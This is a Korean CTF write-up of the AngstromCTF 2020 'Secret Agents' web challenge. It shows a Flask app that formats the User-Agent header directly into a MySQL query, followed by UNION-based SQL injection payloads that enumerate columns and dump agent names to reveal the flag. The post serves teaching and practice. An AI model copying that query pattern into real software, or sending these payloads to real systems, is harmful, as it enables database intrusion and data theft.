---
title: Angstromctf2020 - Secret Agents
author: heogi
categories: [CTF-Writeups]
tags: [web CTF-Writeups Angstromctf2020]
---
# Secret Agents
---
![2020-03-20-15-13-56](https://user-images.githubusercontent.com/45466073/122631504-1c050780-d107-11eb-8b40-fd9a84b665f3.png)

![2020-03-20-15-14-27](https://user-images.githubusercontent.com/45466073/122631505-1efff800-d107-11eb-969d-d0c438c6faa0.png)


```python
#app.py

from flask import Flask, render_template, request
#from flask_limiter import Limiter
#from flask_limiter.util import get_remote_address

from .secret import host, user, passwd, dbname

import mysql.connector


dbconfig = {
	"host":host,
	"user":user,
	"passwd":passwd,
	"database":dbname
}

app = Flask(__name__)
"""
limiter = Limiter(
	app,
	key_func=get_remote_address,
	default_limits=["1 per second"],
)"""


#@limiter.exempt
@app.route("/")
def index():
	return render_template("index.html")


@app.route("/login")
def login():
	u = request.headers.get("User-Agent")

	conn = mysql.connector.connect(
					**dbconfig
					)

	cursor = conn.cursor()

	#cursor.execute("SET GLOBAL connect_timeout=1")
	#cursor.execute("SET GLOVAL wait_timeout=1")	
	#cursor.execute("SET GLOBAL interactive_timeout=1")

	for r in cursor.execute("SELECT * FROM Agents WHERE UA='%s'"%(u), multi=True):
		if r.with_rows:
			res = r.fetchall()
			break

	cursor.close()
	conn.close()

	

	if len(res) == 0:
		return render_template("login.html", msg="stop! you're not allowed in here >:)")

	if len(res) > 1:
		return render_template("login.html", msg="hey! close, but no bananananananananana!!!! (there are many secret agents of course)")


	return render_template("login.html", msg="Welcome, %s"%(res[0][0]))

if __name__ == '__main__':
	app.run('0.0.0.0')
```

백엔드 소스코드가 제공된다.  
User-Agents를 이용한 SQLI 문제이다.

![2020-03-20-15-21-25](https://user-images.githubusercontent.com/45466073/122631512-24f5d900-d107-11eb-9902-8ec8b8e2ec96.png)

컬럼수는 2개이다.

```sql
User-Agent: 'union select group_concat(column_name),2 from information_schema.columns where table_name="Agents"#
```
아래의 SQL문으로 보내면 

![2020-03-20-15-23-30](https://user-images.githubusercontent.com/45466073/122631514-28896000-d107-11eb-9ecd-dcb0b24a0fcb.png)


Name과 UA라는 컬럼명을 가지고 있다는것을 알 수 있다.

```sql
User-Agent: 'union select group_concat(Name),2 from Agents#
```  

![2020-03-20-15-25-10](https://user-images.githubusercontent.com/45466073/122631517-2b845080-d107-11eb-9294-bbcf988b97ee.png)


```text
actf{nyoom_1_4m_sp33d}
```
